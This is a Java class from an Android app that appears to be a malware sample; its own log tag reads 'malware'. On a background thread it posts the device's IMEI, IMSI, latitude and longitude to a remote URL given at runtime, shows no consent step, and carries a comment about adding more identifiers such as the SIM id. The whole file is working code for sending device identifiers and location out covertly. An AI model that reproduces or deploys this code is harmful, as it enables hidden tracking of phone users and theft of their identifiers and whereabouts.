package ommrepublic.com.ledieo;

import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.widget.Toast;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import java.util.ArrayList;
import java.util.List;

/**
 * Created by admin on 9/23/15.
 */
public class WebHelper extends Thread {
    private String url="";
    private String imei="";
    private String imsi="";
    private Double lat=0.0;
    private Double longi=0.0;

    private Context mContext;


    public WebHelper(Context context, String u, String imei, String imsi, Double lat, Double longi) {
        this.url=u;
        this.imei=imei;
        this.imsi=imsi;
        this.lat=lat;
        this.longi=longi;
        mContext = context;
    }

    @Override
    public void run() {
        SendToWebserver(url, imei, imsi, lat, longi);
    }

    @SuppressWarnings({ "rawtypes", "unchecked" })
    public String SendToWebserver(String url, String imei, String imsi, Double lat, Double longi) {
        HttpClient httpclient = new DefaultHttpClient();
        HttpPost httppost = new HttpPost(url);

        try {
            // Add your data
            List nameValuePairs = new ArrayList(2);
            nameValuePairs.add(new BasicNameValuePair("imei", imei));
            nameValuePairs.add(new BasicNameValuePair("imsi", imsi));
            nameValuePairs.add(new BasicNameValuePair("lat", lat.toString()));
            nameValuePairs.add(new BasicNameValuePair("long", longi.toString()));
            // add others like this
            // nameValuePairs.add(new BasicNameValuePair("sim_id", sim_id));

            httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

            // Execute HTTP Post Request
            HttpResponse response = httpclient.execute(httppost);

            Log.d("malware", EntityUtils.toString(response.getEntity()));

            return response.toString();

        } catch (Exception e) {
            e.printStackTrace();
            return e.toString();
        }
    }
}
